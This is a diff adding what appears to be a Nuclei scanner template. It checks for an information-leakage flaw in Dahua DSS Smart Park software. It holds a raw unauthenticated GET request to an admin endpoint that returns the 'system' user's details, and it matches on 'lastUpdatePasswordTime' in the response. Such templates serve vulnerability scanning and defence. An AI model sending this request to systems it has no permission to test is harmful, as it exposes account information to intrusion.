@@ -1,0 +1,26 @@
+id: dahua-dss-info-leakage
+info:
+  name: Dahua DSS user_getUserInfoByUserName.action Information Leakage
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    The attacker can read sensitive system information through user_getUserInfoByUserName.action endpoint in Dahua Smart Park solutions.
+  reference:
+    - https://www.dahuatech.com/product/info/5609.html
+  tags: information-disclosure
+
+http:
+  - raw:
+      - |
+        GET /admin/user_getUserInfoByUserName.action?userName=system HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "lastUpdatePasswordTime"
